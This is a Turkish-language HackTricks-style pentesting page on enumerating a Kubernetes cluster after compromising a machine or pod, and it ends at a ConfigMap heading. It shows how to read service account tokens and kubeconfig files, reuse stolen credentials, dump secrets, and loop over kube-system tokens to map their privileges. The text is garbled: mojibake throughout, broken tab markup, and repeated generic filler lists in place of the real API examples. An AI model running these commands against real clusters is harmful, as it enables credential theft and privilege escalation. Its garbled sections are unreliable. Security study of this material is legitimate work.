# Kubernetes NumaralandÄ±rma

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR'ler gÃ¶ndererek [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}

## Kubernetes Token'larÄ±

EÄŸer bir makineye eriÅŸimi ele geÃ§irdiyseniz, kullanÄ±cÄ± Kubernetes platformuna eriÅŸime sahip olabilir. Token genellikle **`KUBECONFIG`** Ã§evresel deÄŸiÅŸkeni tarafÄ±ndan iÅŸaret edilen bir dosyada veya **`~/.kube`** iÃ§inde bulunur.

Bu klasÃ¶rde genellikle **API sunucusuna baÄŸlanmak iÃ§in tokenlar ve yapÄ±landÄ±rmalar** iÃ§eren yapÄ±landÄ±rma dosyalarÄ± bulabilirsiniz. Bu klasÃ¶rde ayrÄ±ca daha Ã¶nce alÄ±nmÄ±ÅŸ bilgileri iÃ§eren bir Ã¶nbellek klasÃ¶rÃ¼ bulunabilir.

Bir Kubernetes ortamÄ±ndaki bir pod'u ele geÃ§irdiyseniz, mevcut K8 ortamÄ± hakkÄ±nda tokenlar ve bilgiler bulabileceÄŸiniz diÄŸer yerler vardÄ±r:

### Servis HesabÄ± Token'larÄ±

Devam etmeden Ã¶nce, Kubernetes'te bir servis nedir bilmiyorsanÄ±z, **bu baÄŸlantÄ±yÄ± takip edin ve en azÄ±ndan Kubernetes mimarisi hakkÄ±ndaki bilgileri okuyun.**

Kubernetes belgelerinden alÄ±nan:

_â€œBir pod oluÅŸturduÄŸunuzda, bir servis hesabÄ± belirtmezseniz, aynÄ± ad alanÄ±ndaki_ varsayÄ±lan _servis hesabÄ± otomatik olarak atanÄ±r.â€_

**ServiceAccount**, Kubernetes tarafÄ±ndan yÃ¶netilen ve bir pod'da Ã§alÄ±ÅŸan iÅŸlemlere kimlik saÄŸlamak iÃ§in kullanÄ±lan bir nesnedir.\
Her servis hesabÄ±nÄ±n buna iliÅŸkin bir sÄ±rrÄ± vardÄ±r ve bu sÄ±r, bir taÅŸÄ±yÄ±cÄ± belirteci iÃ§erir. Bu, iki taraf arasÄ±nda iddialarÄ± gÃ¼venli bir ÅŸekilde temsil etmek iÃ§in bir yÃ¶ntem olan JSON Web Token (JWT)â€™dir.

Genellikle **birinin** ÅŸu dizinlerinden biri:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

ÅŸu dosyalarÄ± iÃ§erir:

* **ca.crt**: Kubernetes iletiÅŸimlerini kontrol etmek iÃ§in ca sertifikasÄ±dÄ±r
* **namespace**: GeÃ§erli ad alanÄ±nÄ± gÃ¶sterir
* **token**: GeÃ§erli pod'un **servis belirteci**ni iÃ§erir.

ArtÄ±k belirtece sahip olduÄŸunuza gÃ¶re, API sunucusunu **`KUBECONFIG`** Ã§evresel deÄŸiÅŸkeninde bulabilirsiniz. Daha fazla bilgi iÃ§in `(env | set) | grep -i "kuber|kube`**`"`** komutunu Ã§alÄ±ÅŸtÄ±rÄ±n.

Servis hesabÄ± belirteci, **sa.key** dosyasÄ±nda bulunan anahtar tarafÄ±ndan imzalanmakta ve **sa.pub** tarafÄ±ndan doÄŸrulanmaktadÄ±r.

**Kubernetes**'te varsayÄ±lan konum:

* /etc/kubernetes/pki

**Minikube**'de varsayÄ±lan konum:

* /var/lib/localkube/certs

### SÄ±cak Podlar

_**SÄ±cak podlar**_, ayrÄ±calÄ±klÄ± bir servis hesabÄ± belirtecini iÃ§eren podlardÄ±r. AyrÄ±calÄ±klÄ± bir servis hesabÄ± belirtisi, gizli gÃ¶revleri yapma iznine sahip bir belirteÃ§tir, Ã¶rneÄŸin sÄ±rlarÄ± listeleme, pod'lar oluÅŸturma vb.

## RBAC

**RBAC** nedir bilmiyorsanÄ±z, **bu bÃ¶lÃ¼mÃ¼ okuyun.**

## NumaralandÄ±rma Hile KaÄŸÄ±dÄ±

Bir K8s ortamÄ±nÄ± numaralandÄ±rmak iÃ§in ÅŸunlara ihtiyacÄ±nÄ±z vardÄ±r:

* Bir **geÃ§erli kimlik doÄŸrulama belirteci**. Ã–nceki bÃ¶lÃ¼mde bir kullanÄ±cÄ± belirteci ve bir servis hesabÄ± belirteci aramak iÃ§in nerede arayacaÄŸÄ±mÄ±zÄ± gÃ¶rdÃ¼k.
* Kubernetes API'sinin **adresi (**_**https://host:port**_**)**. Bu genellikle Ã§evresel deÄŸiÅŸkenlerde ve/veya kube yapÄ±landÄ±rma dosyasÄ±nda bulunabilir.
* **Ä°steÄŸe baÄŸlÄ±**: **API sunucusunu doÄŸrulamak iÃ§in ca.crt**. Bu, belirtecin bulunduÄŸu yerlerde bulunabilir. Bu, API sunucusu sertifikasÄ±nÄ± doÄŸrulamak iÃ§in kullanÄ±ÅŸlÄ±dÄ±r, ancak `kubectl` ile `--insecure-skip-tls-verify` veya `curl` ile `-k` kullanarak bunu gerekli olmayacaktÄ±r.

Bu ayrÄ±ntÄ±larla Kubernetes'i **numaralandÄ±rabilirsiniz**. API'nin bir nedenle **Ä°nternet Ã¼zerinden eriÅŸilebilir** olduÄŸu durumlarda, bu bilgileri indirip platformu kendi makinenizden numaralandÄ±rabilirsiniz.

Ancak genellikle **API sunucusu iÃ§ aÄŸda** bulunur, bu nedenle ona eriÅŸmek iÃ§in ele geÃ§irilmiÅŸ makineden kendi makinenize eriÅŸmek iÃ§in bir tÃ¼nel oluÅŸturmanÄ±z gerekecektir veya [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) ikilisini yÃ¼kleyebilir veya API sunucusuna doÄŸrudan HTTP istekleri yapmak iÃ§in `curl/wget/herhangi bir ÅŸey` kullanabilirsiniz.

### `list` ve `get` fiilleri arasÄ±ndaki farklar

**`get`** izinleriyle belirli varlÄ±klarÄ±n bilgilerine eriÅŸebilirsiniz (_`kubectl`'deki `describe` seÃ§eneÄŸi_).
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
EÄŸer **`list`** izniniz varsa, bir varlÄ±k tÃ¼rÃ¼nÃ¼ listelemek iÃ§in API isteklerini yÃ¼rÃ¼tmenize izin verilir (_`kubectl`_ iÃ§indeki _`get`_ seÃ§eneÄŸi):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
EÄŸer **`watch`** izniniz varsa, varlÄ±klarÄ± izlemek iÃ§in API isteklerini yÃ¼rÃ¼tmenize izin verilir:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
They open a streaming connection that returns you the full manifest of a Deployment whenever it changes (or when a new one is created).

{% hint style="danger" %}
The following `kubectl` commands indicates just how to list the objects. If you want to access the data you need to use `describe` instead of `get`
{% endhint %}

### Using curl

From inside a pod you can use several env variables:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
VarsayÄ±lan olarak, pod, **`kubernetes.default.svc`** alan adÄ±ndaki **kube-api sunucusuna eriÅŸebilir** ve **`/etc/resolv.config`** dosyasÄ±nda kube aÄŸÄ±nÄ± gÃ¶rebilirsiniz (aynÄ± aralÄ±ÄŸÄ±n ".1"si kube-api uÃ§ noktasÄ±dÄ±r).
{% endhint %}

### kubectl KullanÄ±mÄ±

Token ve API sunucusunun adresine sahip olarak, burada belirtildiÄŸi gibi kubectl veya curl kullanarak eriÅŸebilirsiniz:

VarsayÄ±lan olarak, APISERVER `https://` ÅŸemasÄ±yla iletiÅŸim kurmaktadÄ±r.
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> EÄŸer URL'de `https://` yoksa, KÃ¶tÃ¼ Ä°stek gibi bir Hata Alabilirsiniz.

[**Resmi kubectl hile yapraÄŸÄ±na buradan ulaÅŸabilirsiniz**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). AÅŸaÄŸÄ±daki bÃ¶lÃ¼mlerin amacÄ±, elde ettiÄŸiniz yeni K8s'i sÄ±ralÄ± bir ÅŸekilde sÄ±ralamak ve anlamaktÄ±r.

`kubectl`'Ã¼n gÃ¶nderdiÄŸi HTTP isteÄŸini bulmak iÃ§in `-v=8` parametresini kullanabilirsiniz.

#### MitM kubectl - kubectl'i Proxy Olarak Kullanma
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Mevcut YapÄ±landÄ±rma

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

EÄŸer bazÄ± kullanÄ±cÄ± kimlik bilgilerini Ã§almayÄ± baÅŸardÄ±ysanÄ±z, bunlarÄ± **yerel olarak yapÄ±landÄ±rabilirsiniz** Ã¶rneÄŸin:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Desteklenen KaynaklarÄ± Al

Bu bilgi ile listeleyebileceÄŸiniz tÃ¼m hizmetleri bileceksiniz

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### Mevcut Yetkileri Al

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %} 

### API Enumerasyonu

API'leri belirlemek ve sorgulamak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyin:

1. **API SunucularÄ±nÄ± TanÄ±mlama**: API sunucularÄ±nÄ± belirlemek iÃ§in DNS sorgularÄ±, port taramalarÄ± ve web uygulamasÄ± taramalarÄ± yapÄ±n.

2. **API SÃ¼rÃ¼mlerini Belirleme**: API sÃ¼rÃ¼mlerini belirlemek iÃ§in belgelere, sÃ¼rÃ¼m numaralarÄ±na ve deÄŸiÅŸiklik gÃ¼nlÃ¼klerine bakÄ±n.

3. **API YÃ¶nlendirmelerini Ä°nceleme**: API yÃ¶nlendirmelerini inceleyerek gizli veya yetkisiz eriÅŸim noktalarÄ±nÄ± keÅŸfedin.

4. **API SorgularÄ±nÄ± Ä°nceleme**: API sorgularÄ±nÄ± inceleyerek yetkisiz veri eriÅŸimini tespit edin.

5. **API Yetkilendirmesini Ä°nceleme**: API yetkilendirmesini inceleyerek yetkisiz eriÅŸim yÃ¶ntemlerini belirleyin.

6. **API HatalarÄ±nÄ± Ä°nceleme**: API hatalarÄ±nÄ± inceleyerek gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit edin ve kÃ¶tÃ¼ niyetli saldÄ±rÄ±lara karÅŸÄ± Ã¶nlem alÄ±n.

{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

AyrÄ±calÄ±klarÄ±nÄ±zÄ± kontrol etmenin baÅŸka bir yolu, [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)**** aracÄ±nÄ± kullanmaktÄ±r.

**Kubernetes RBAC** hakkÄ±nda daha fazla bilgi edinebilirsiniz:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Hangi ayrÄ±calÄ±klara sahip olduÄŸunuzu** bildikten sonra, aÅŸaÄŸÄ±daki sayfayÄ± kontrol ederek bu ayrÄ±calÄ±klarÄ± **kÃ¶prÃ¼ ayrÄ±calÄ±klarÄ±na yÃ¼kseltip yÃ¼kseltemeyeceÄŸinizi** anlayabilirsiniz:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### DiÄŸer rolleri alÄ±n

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %} 

### API Enumerasyonu

API'leri belirlemek ve sorgulamak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyin:

1. **API Sunucu IP Adreslerini Belirleme**: API sunucularÄ±nÄ±n IP adreslerini belirleyin.

2. **API Endpoint'leri TarayÄ±n**: API endpoint'lerini tarayarak mevcut olanlarÄ± belirleyin.

3. **API MetotlarÄ±nÄ± Belirleme**: API endpoint'lerine hangi metotlarÄ±n (GET, POST, PUT, DELETE vb.) izin verildiÄŸini belirleyin.

4. **API Yetkilendirme ve Kimlik DoÄŸrulama MekanizmalarÄ±nÄ± Belirleme**: API'lerin yetkilendirme ve kimlik doÄŸrulama mekanizmalarÄ±nÄ± belirleyin.

5. **API SÃ¼rÃ¼mlerini Belirleme**: API'lerin desteklediÄŸi sÃ¼rÃ¼mleri belirleyin.

6. **API DokÃ¼mantasyonunu Ä°nceleme**: API'lerin dokÃ¼mantasyonunu inceleyerek daha fazla bilgi edinin.

7. **API GÃ¼venlik Zafiyetlerini Arama**: API'lerde yaygÄ±n olarak bulunan gÃ¼venlik zafiyetlerini arayÄ±n.

{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Namespace'larÄ± Al

Kubernetes, aynÄ± fiziksel kÃ¼me tarafÄ±ndan desteklenen **Ã§oklu sanal kÃ¼meleri** destekler. Bu sanal kÃ¼meler **namespace** olarak adlandÄ±rÄ±lÄ±r.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %} 

## API

API'leri belirlemek ve sorgulamak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyin:

1. API sunucularÄ±nÄ± belirlemek iÃ§in hedef alan adÄ±nÄ± kullanÄ±n.
2. `kubectl get svc` komutunu kullanarak hizmetleri listeleyin.
3. `kubectl describe svc <service-name>` komutunu kullanarak hizmet hakkÄ±nda ayrÄ±ntÄ±lÄ± bilgi alÄ±n.
4. `kubectl get pods --all-namespaces` komutunu kullanarak tÃ¼m pod'larÄ± listeleyin.
5. `kubectl describe pod <pod-name> -n <namespace>` komutunu kullanarak pod hakkÄ±nda ayrÄ±ntÄ±lÄ± bilgi alÄ±n.
6. API'lerin kullanÄ±labilirliÄŸini ve yetkilendirme dÃ¼zeyini kontrol edin.
7. API'lerin gÃ¼venlik ayarlarÄ±nÄ± inceleyin ve gerektiÄŸinde gÃ¼Ã§lendirin.

Bu adÄ±mlar, Kubernetes ortamÄ±nda API'leri belirlemek ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmek iÃ§in kullanÄ±ÅŸlÄ± olacaktÄ±r.

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### SÄ±rlarÄ± Al

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

## API

API'leri belirlemek ve sorgulamak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyin:

1. API sunucularÄ±nÄ± belirlemek iÃ§in hedef alan IP aralÄ±ÄŸÄ±nÄ± taramak.
2. API sunucularÄ±na yÃ¶nelik hedef tarama sonuÃ§larÄ±nÄ± analiz etmek.
3. API sunucularÄ±na karÅŸÄ± aÃ§Ä±k olan portlarÄ± belirlemek.
4. API sunucularÄ±na karÅŸÄ± kullanÄ±lan protokolleri belirlemek.
5. API sunucularÄ±na karÅŸÄ± kullanÄ±lan HTTP baÅŸlÄ±klarÄ±nÄ± incelemek.
6. API sunucularÄ±na karÅŸÄ± kullanÄ±lan HTTP metotlarÄ±nÄ± incelemek.
7. API sunucularÄ±na karÅŸÄ± kullanÄ±lan HTTP yanÄ±t kodlarÄ±nÄ± incelemek.
8. API sunucularÄ±na karÅŸÄ± yetkisiz eriÅŸim noktalarÄ±nÄ± belirlemek.
9. API sunucularÄ±na karÅŸÄ± yetkisiz eriÅŸim noktalarÄ±nÄ± sorgulamak.
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

EÄŸer sÄ±rlarÄ± okuyabiliyorsanÄ±z, her bir belirteÃ§le ilgili ayrÄ±calÄ±klarÄ± almak iÃ§in aÅŸaÄŸÄ±daki satÄ±rlarÄ± kullanabilirsiniz:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Servis HesaplarÄ±nÄ± Al

Bu sayfanÄ±n baÅŸÄ±nda tartÄ±ÅŸÄ±ldÄ±ÄŸÄ± gibi **bir pod Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda genellikle ona bir servis hesabÄ± atanÄ±r**. Bu nedenle, servis hesaplarÄ±nÄ±, izinlerini ve nerede Ã§alÄ±ÅŸtÄ±klarÄ±nÄ± listelemek bir kullanÄ±cÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ± yÃ¼kseltmesine olanak tanÄ±yabilir.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %} 

## API

API'leri belirlemek ve sorgulamak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. API sunucularÄ±nÄ± belirlemek iÃ§in Kubernetes iÃ§inde Ã§alÄ±ÅŸan pod'larÄ± taramak.
2. API sunucularÄ±na eriÅŸmek iÃ§in hedef pod'larÄ±nÄ± hedefleyin.
3. API'lerin kullanÄ±labilirliÄŸini ve yetkilendirme mekanizmalarÄ±nÄ± inceleyin.
4. API'lerin gÃ¼venlik zafiyetlerini araÅŸtÄ±rÄ±n ve sÄ±zma testleri yapÄ±n.

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### DaÄŸÄ±tÄ±mlarÄ± Al

DaÄŸÄ±tÄ±mlar Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± gereken **bileÅŸenleri** belirtir.

{% tabs %}
{% tab title="kubectl" %}
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### API Enumerasyonu

API'larÄ± belirlemek ve sorgulamak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyin:

1. **API Endpoint'leri Tarama**: API endpoint'lerini belirlemek iÃ§in otomatik araÃ§lar kullanÄ±n veya manuel olarak tarama yapÄ±n.
2. **HTTP MetotlarÄ±nÄ± Sorgulama**: API endpoint'lerine GET, POST, PUT, DELETE gibi HTTP metotlarÄ±yla sorgulamalar yapÄ±n.
3. **Parametrelerde Fuzzing**: API endpoint'lerine geÃ§irilen parametrelerde fuzzing yaparak gÃ¼venlik aÃ§Ä±klarÄ± arayÄ±n.
4. **Hata MesajlarÄ± Ä°nceleme**: API tarafÄ±ndan dÃ¶ndÃ¼rÃ¼len hata mesajlarÄ±nÄ± inceleyerek bilgi toplayÄ±n.
5. **Header Bilgilerini Kontrol Etme**: API isteklerinde gÃ¶nderilen header bilgilerini kontrol ederek gÃ¼venlik zafiyetleri arayÄ±n.

Bu adÄ±mlarÄ± takip ederek API'larÄ± etkili bir ÅŸekilde enumerate edebilir ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit edebilirsiniz.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
### PodlarÄ± Al

Podlar gerÃ§ek **konteynerlerdir** ve **Ã§alÄ±ÅŸacaklardÄ±r**.
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### API Enumerasyonu

API'larÄ± belirlemek ve sorgulamak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyin:

1. **API Endpoint'leri Tarama**: API endpoint'lerini belirlemek iÃ§in otomatik araÃ§lar kullanÄ±n veya manuel olarak tarama yapÄ±n.
2. **API MetotlarÄ± ve Parametreleri**: API metotlarÄ±nÄ± ve destekledikleri parametreleri belirleyin.
3. **Yetkilendirme ve Kimlik DoÄŸrulama**: API'ye eriÅŸmek iÃ§in gereken yetkilendirme ve kimlik doÄŸrulama mekanizmalarÄ±nÄ± belirleyin.
4. **API SÃ¼rÃ¼mleri**: Desteklenen API sÃ¼rÃ¼mlerini belirleyin ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± kontrol edin.
5. **Hata MesajlarÄ±**: API'den dÃ¶nen hata mesajlarÄ±nÄ± inceleyerek gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit edin.

Bu adÄ±mlarÄ± takip ederek API'larÄ± etkili bir ÅŸekilde enumere edebilir ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit edebilirsiniz.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
### Servisleri Al

Kubernetes **servisleri**, bir hizmeti belirli bir baÄŸlantÄ± noktasÄ±nda ve IP adresinde **sunmak iÃ§in kullanÄ±lÄ±r** (bu, aslÄ±nda hizmeti sunan pod'lara yÃ¼k dengeleyici olarak hareket edecektir). Bu, saldÄ±rmaya Ã§alÄ±ÅŸabileceÄŸiniz diÄŸer servisleri bulabileceÄŸiniz yeri bilmek aÃ§Ä±sÄ±ndan ilginÃ§tir.
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
### DÃ¼ÄŸÃ¼mleri Al

KÃ¼me iÃ§inde yapÄ±landÄ±rÄ±lmÄ±ÅŸ olan tÃ¼m **dÃ¼ÄŸÃ¼mleri alÄ±n**.

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %} 

### API Enumerasyonu

API'leri belirlemek ve sorgulamak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. **API Endpoint'leri Tarama**: API endpoint'lerini belirlemek iÃ§in otomatik araÃ§lar kullanÄ±n veya manuel olarak tarama yapÄ±n.
   
2. **HTTP MetotlarÄ±nÄ± Kullanma**: Belirlenen endpoint'leri HTTP GET, POST, PUT, DELETE gibi farklÄ± metotlarla sorgulayÄ±n.
   
3. **Parametrelerle Oynama**: Endpoint'lere farklÄ± parametreler ekleyerek davranÄ±ÅŸlarÄ±nÄ± test edin.
   
4. **Hata KodlarÄ± Ä°nceleme**: API yanÄ±tlarÄ±nda dÃ¶nen hata kodlarÄ±nÄ± inceleyerek zayÄ±f noktalarÄ± belirleyin.
   
5. **Gizli Endpoint'leri KeÅŸfetme**: Gizli veya yetkisiz eriÅŸime aÃ§Ä±k olabilecek endpoint'leri tespit edin.

Bu adÄ±mlarÄ± takip ederek API'lerde gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit edebilir ve Ã¶nlem alabilirsiniz.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
### DaemonSets'i Al

**DaemonSets**, kÃ¼menin tÃ¼m dÃ¼ÄŸÃ¼mlerinde (veya seÃ§ilen dÃ¼ÄŸÃ¼mlerde) **belirli bir kapsÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±ÄŸÄ±ndan emin olmayÄ± saÄŸlar**. DaemonSet'i sildiÄŸinizde, onun tarafÄ±ndan yÃ¶netilen kapsÃ¼ller de kaldÄ±rÄ±lacaktÄ±r.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %} 

### API Enumerasyonu

API'leri belirlemek ve sorgulamak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyin:

1. **API Sunucu IP Adreslerini Belirleme**: Kubernetes kÃ¼mesindeki API sunucularÄ±nÄ±n IP adreslerini belirleyin.

2. **API SÃ¼rÃ¼mlerini Belirleme**: API sunucularÄ±nÄ±n desteklediÄŸi sÃ¼rÃ¼mleri belirleyin.

3. **API YÃ¶nlendirmelerini Ä°nceleme**: API sunucularÄ±nÄ±n yÃ¶nlendirmelerini inceleyerek farklÄ± API'lerin nerede barÄ±ndÄ±rÄ±ldÄ±ÄŸÄ±nÄ± belirleyin.

4. **API EriÅŸim Denetimlerini Kontrol Etme**: API'lerin eriÅŸim denetimlerini kontrol ederek yetkisiz eriÅŸimleri tespit edin.

5. **API Kimlik DoÄŸrulama MekanizmalarÄ±nÄ± Ä°nceleme**: API'lerin kullandÄ±ÄŸÄ± kimlik doÄŸrulama mekanizmalarÄ±nÄ± inceleyerek zayÄ±f noktalarÄ± belirleyin.

6. **API Ä°steklerini Ä°zleme ve Analiz Etme**: API isteklerini izleyerek ve analiz ederek gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit edin.

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
### Cronjob'u Al

Cron iÅŸleri, crontab benzeri bir sÃ¶zdizimi kullanarak belirli bir eylemi gerÃ§ekleÅŸtirecek bir kapsÃ¼lÃ¼n baÅŸlatÄ±lmasÄ±nÄ± zamanlamayÄ± saÄŸlar.
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %} 

### API Enumerasyonu

API'larÄ± belirlemek ve sorgulamak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. **API Endpoint'leri Tarama**: API endpoint'lerini belirlemek iÃ§in otomatik araÃ§lar kullanÄ±n veya manuel olarak tarama yapÄ±n.
2. **API MetotlarÄ± ve Parametreleri Ä°nceleme**: API metotlarÄ±nÄ± ve parametrelerini anlamak iÃ§in belgeleri inceleyin veya deneme yanÄ±lma yÃ¶ntemini kullanÄ±n.
3. **API Yetkilendirme ve Kimlik DoÄŸrulama Denemeleri**: API'ye yetkisiz eriÅŸim saÄŸlamak iÃ§in yetkilendirme ve kimlik doÄŸrulama zayÄ±flÄ±klarÄ±nÄ± araÅŸtÄ±rÄ±n.
4. **API Rate Limiting ve Throttling Denemeleri**: API'yi aÅŸÄ±rÄ± yÃ¼kleme veya sÄ±nÄ±rlama zayÄ±flÄ±klarÄ±nÄ± tespit etmek iÃ§in rate limiting ve throttling denemeleri yapÄ±n.
5. **API Hata MesajlarÄ± Ä°nceleme**: API hata mesajlarÄ±nÄ± inceleyerek bilgi sÄ±zdÄ±rmaya yÃ¶nelik zayÄ±flÄ±klarÄ± tespit edin.

Bu adÄ±mlarÄ± takip ederek API'larÄ± etkili bir ÅŸekilde enumerate edebilir ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit edebilirsiniz.

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### ConfigMap'Ä± Al
